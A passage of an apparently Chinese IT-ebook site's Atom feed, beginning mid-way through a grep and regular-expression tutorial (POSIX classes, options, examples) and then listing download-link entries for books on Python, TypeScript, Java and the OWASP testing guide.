class=&quot;line&quot;&gt;匹配a或b或c。如：grep|sed匹配grep或sed&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;分组符号，如：love(able|rs)ov+匹配loveable或lovers，匹配一个或多个ov。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;x&amp;#123;m&amp;#125;,x&amp;#123;m,&amp;#125;,x&amp;#123;m,n&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;作用同x\&amp;#123;m\&amp;#125;,x\&amp;#123;m,\&amp;#125;,x\&amp;#123;m,n\&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;4-POSIX字符类&quot;&gt;&lt;a href=&quot;#4-POSIX字符类&quot; class=&quot;headerlink&quot; title=&quot;4. POSIX字符类&quot;&gt;&lt;/a&gt;4. POSIX字符类&lt;/h2&gt;&lt;p&gt;为了在不同国家的字符编码中保持一至，POSIX(The Portable Operating System Interface)增加了特殊的字符类，如[:alnum:]是A-Za-z0-9的另一个写法。要把它们放到[]号内才能成为正则表达式，如[A-Za-z0-9]或[[:alnum:]]。在linux下的grep除fgrep外，都支持POSIX的字符类。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[:alnum:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;文字数字字符&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:alpha:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;文字字符&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:digit:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;数字字符&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:graph:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;非空字符（非空格、控制字符）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:lower:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;小写字符&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:cntrl:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;控制字符&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:print:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;非空字符（包括空格）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:punct:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;标点符号&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:space:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;所有空白字符（新行，空格，制表符）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:upper:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;大写字符&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[:xdigit:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;十六进制数字（0-9，a-f，A-F）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;5-Grep命令选项&quot;&gt;&lt;a href=&quot;#5-Grep命令选项&quot; class=&quot;headerlink&quot; title=&quot;5. Grep命令选项&quot;&gt;&lt;/a&gt;5. Grep命令选项&lt;/h2&gt;&lt;p&gt;&lt;code&gt;-&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同时显示匹配行上下的？行，如：grep -2 pattern filename同时显示匹配行的上下2行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-b&lt;/code&gt;，&lt;code&gt;--byte-offset&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;打印匹配行前面打印该行所在的块号码。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-c&lt;/code&gt;,&lt;code&gt;--count&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;只打印匹配的行数，不显示匹配的内容。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-f File&lt;/code&gt;，&lt;code&gt;--file=File&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;从文件中提取模板。空文件中包含0个模板，所以什么都不匹配。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-h&lt;/code&gt;，&lt;code&gt;--no-filename&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当搜索多个文件时，不显示匹配文件名前缀。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-i&lt;/code&gt;，&lt;code&gt;--ignore-case&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;忽略大小写差别。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-q&lt;/code&gt;，&lt;code&gt;--quiet&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;取消显示，只返回退出状态。0则表示找到了匹配的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-l&lt;/code&gt;，&lt;code&gt;--files-with-matches&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;打印匹配模板的文件清单。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-L&lt;/code&gt;，&lt;code&gt;--files-without-match&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;打印不匹配模板的文件清单。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-n&lt;/code&gt;，&lt;code&gt;--line-number&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在匹配的行前面打印行号。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-s&lt;/code&gt;，&lt;code&gt;--silent&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;不显示关于不存在或者无法读取文件的错误信息。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-v&lt;/code&gt;，&lt;code&gt;--revert-match&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;反检索，只显示不匹配的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-w&lt;/code&gt;，&lt;code&gt;--word-regexp&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果被\&amp;lt;和\&amp;gt;引用，就把表达式做为一个单词搜索。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;-V&lt;/code&gt;，&lt;code&gt;--version&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;显示软件版本信息。&lt;/p&gt;
&lt;h2 id=&quot;6-实例&quot;&gt;&lt;a href=&quot;#6-实例&quot; class=&quot;headerlink&quot; title=&quot;6. 实例&quot;&gt;&lt;/a&gt;6. 实例&lt;/h2&gt;&lt;p&gt;要用好grep这个工具，其实就是要写好正则表达式，所以这里不对grep的所有功能进行实例讲解，只列几个例子，讲解一个正则表达式的写法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ ls | grep &amp;#39;^a&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过管道过滤ls输出的内容，只显示以a开头的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ grep &amp;#39;test&amp;#39; d*&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;显示所有以d开头的文件中包含test的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ grep &amp;#39;test&amp;#39; aa bb cc&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;显示在aa，bb，cc文件中匹配test的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ grep &amp;#39;[a-z]\{5\}&amp;#39; aa&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;显示所有包含每个字符串至少有5个连续小写字符的字符串的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ grep &amp;#39;w\(es\)t.*\1&amp;#39; aa&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果west被匹配，则es就被存储到内存中，并标记为1，然后搜索任意个字符（.&lt;em&gt;），这些字符后面紧跟着另外一个es（\1），找到就显示该行。如果用egrep或grep -E，就不用”\”号进行转义，直接写成’w(es)t.&lt;/em&gt;\1’就可以了。&lt;/p&gt;
&lt;h2 id=&quot;7-技巧&quot;&gt;&lt;a href=&quot;#7-技巧&quot; class=&quot;headerlink&quot; title=&quot;7. 技巧&quot;&gt;&lt;/a&gt;7. 技巧&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在结果集中显示彩色的字符。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;export GREP_OPTIONS=&amp;apos;--color=always&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export GREP_COLOR=&amp;apos;1;32&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;整理：Jims of &lt;a href=&quot;http://www.ringkee.com&quot;&gt;肥肥世家&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;mailto:jims.yang@gmail.com&quot;&gt;jims.yang@gmail.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Copyright © 2004 本文遵从GPL协议，欢迎转载、修改、散布。&lt;/p&gt;
&lt;p&gt;发布时间：2004年7月16日&lt;/p&gt;
&lt;p&gt;更新时间：2005年8月24日&lt;/p&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://it-ebooks.flygon.net/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>灰帽 Python 之旅</title>
    <link href="http://it-ebooks.flygon.net/grey-hat-python/"/>
    <id>http://it-ebooks.flygon.net/grey-hat-python/</id>
    <published>2016-03-11T03:08:37.000Z</published>
    <updated>2016-03-11T03:09:59.156Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/grey-hat-python.jpg?build=1451289687917&amp;amp;v=12.0.2&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/book/wizardforcel/grey-hat-python/details&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/pdf/book/wizardforcel/grey-hat-python&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PDF格式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/epub/book/wizardforcel/grey-hat-python&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;EPUB格式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/mobi/book/wizardforcel/grey-hat-python&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MOBI格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/grey-hat-python.jpg?build=1451289687917&amp;amp;v=12.0.2&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="逆向" scheme="http://it-ebooks.flygon.net/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>TypeScript Handbook（中文版）</title>
    <link href="http://it-ebooks.flygon.net/typescript-handbook/"/>
    <id>http://it-ebooks.flygon.net/typescript-handbook/</id>
    <published>2016-03-11T01:42:51.000Z</published>
    <updated>2016-03-11T01:44:38.708Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/zhongsp/typescript-handbook.jpg?build=1452495789786&amp;amp;v=12.0.4&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;译者：&lt;a href=&quot;https://github.com/zhongsp&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;zhongsp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/zhongsp/TypeScript&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;TypeScript&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/book/zhongsp/typescript-handbook/details&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/pdf/book/zhongsp/typescript-handbook&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PDF格式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/epub/book/zhongsp/typescript-handbook&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;EPUB格式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/mobi/book/zhongsp/typescript-handbook&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MOBI格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/zhongsp/typescript-handbook.jpg?build=1452495789786&amp;amp;v=12.0.4&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;译者：&lt;a href=&quot;https://github.com/zhongsp&quot;&gt;zhongsp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/zhongsp/TypeScript&quot;&gt;TypeScript&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="typescript" scheme="http://it-ebooks.flygon.net/tags/typescript/"/>
    
  </entry>
  
  <entry>
    <title>Java 编程要点</title>
    <link href="http://it-ebooks.flygon.net/essential-java/"/>
    <id>http://it-ebooks.flygon.net/essential-java/</id>
    <published>2016-03-11T01:40:43.000Z</published>
    <updated>2016-03-11T01:42:35.716Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/waylau/essential-java.jpg?build=1451704333665&amp;amp;v=12.0.2&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者：&lt;a href=&quot;https://github.com/waylau&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;waylau&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/waylau/essential-java&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;essential-java&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/book/waylau/essential-java/details&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/pdf/book/waylau/essential-java&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PDF格式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/epub/book/waylau/essential-java&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;EPUB格式&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gitbook.com/download/mobi/book/waylau/essential-java&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MOBI格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/waylau/essential-java.jpg?build=1451704333665&amp;amp;v=12.0.2&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者：&lt;a href=&quot;https://github.com/waylau&quot;&gt;waylau&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/waylau/essential-java&quot;&gt;essential-java&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="java" scheme="http://it-ebooks.flygon.net/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>OWASP测试指南V3.0中文版</title>
    <link href="http://it-ebooks.flygon.net/otg-v3/"/>
    <id>http://it-ebooks.flygon.net/otg-v3/</id>
    <published>2016-03-07T10:28:42.000Z</published>
    <updated>2016-03-07T10:29:32.999Z</updated>
    
    <content type="html">&lt;p&gt;来源：&lt;a href=&quot;http://www.owasp.org.cn/owasp-project/OTG/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;OWASP 测试指南&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;p&gt;暂无。&lt;/p&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.owasp.org.cn/owasp-project/download/OWASP_testing_guide&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PDF格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;来源：&lt;a href=&quot;http://www.owasp.org.cn/owasp-project/OTG/&quot;&gt;OWASP 测试指南&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://it-ebooks.flygon.net/tags/%E6%B8%97%E9%80%8F/"/>
    
      <category term="测试" scheme="http://it-ebooks.flygon.net/tags/%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
</feed>
